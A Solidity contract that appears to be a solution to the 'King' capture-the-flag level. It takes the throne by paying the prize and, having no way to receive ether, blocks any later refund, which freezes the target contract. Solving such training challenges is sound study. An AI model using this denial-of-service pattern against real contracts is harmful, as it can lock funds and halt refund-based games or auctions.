// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './King.sol';
import 'hardhat/console.sol';

contract EternalHeir {

  King private father;
  event LongLiveTheKing(address newKing);
  event Threason(address traitor);

  constructor(address payable _father) {
    father = King(_father);
  }

  function prize() public view returns (uint) {
    return father.prize();
  }

  function claim() external payable returns (bool result){
    require(msg.value >= father.prize(), 'A too small amount to pay');
    (result,) = payable(father).call{value: msg.value}("");
    if (result) {
      emit LongLiveTheKing(father._king());
    }
  }
}
